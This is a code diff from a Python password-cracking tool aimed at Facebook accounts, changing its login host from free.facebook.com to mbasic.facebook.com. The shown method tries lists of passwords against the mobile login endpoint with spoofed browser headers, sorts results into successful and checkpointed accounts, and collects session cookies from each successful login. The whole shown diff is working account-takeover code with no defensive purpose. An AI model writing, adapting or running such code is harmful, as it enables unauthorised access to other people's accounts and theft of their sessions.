@@ -385,11 +385,11 @@ class Crack:
 	def metode_api(self,user,pwx):
 		prog.update(des,description=f" {H2}•{P2} crack {H2}aman{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
 		prog.advance(des)
-		url = 'free.facebook.com'
+		#url = 'mbasic.facebook.com'
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				link = ses.get(f"https://{url}/login.php?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&refsrc=de1precated&_rdr")
+				link = ses.get(f"https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&refsrc=de1precated&_rdr")
 				params = {"lsd":re.search('name="lsd" value="(.*?)"',
 				str(link.text)).group(1),
 				"jazoest":re.search('name="jazoest" value="(.*?)"', 
@@ -402,9 +402,9 @@ class Crack:
 					'accept': '*/*',
 					'accept-encoding': 'gzip, deflate, br', 
 					'accept-language': 'id,en-US;q=0.9,en;q=0.8', 
-					'content-type': 'application/x-www-form-urlencoded','Host': f'https://{url}', 
-					'origin': f'https://{url}', 
-					'referer': f'https://{url}/login.php?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&refsrc=de1precated&_rdr', 
+					'content-type': 'application/x-www-form-urlencoded','Host': 'https://mbasic.facebook.com', 
+					'origin': 'https://mbasic.facebook.com', 
+					'referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&refsrc=de1precated&_rdr', 
 					'user-agent': Session().generate_ugent(), 
 					'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
 					'sec-ch-ua-mobile': '?0',
@@ -413,7 +413,7 @@ class Crack:
 					'sec-fetch-site': 'same-origin',
 					'x-requested-with': 'XMLHttpRequest'
 				}
-				post = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100",params=params, headers=headers, allow_redirects=False)
+				post = ses.post(f"https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					self.ok.append(user)
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
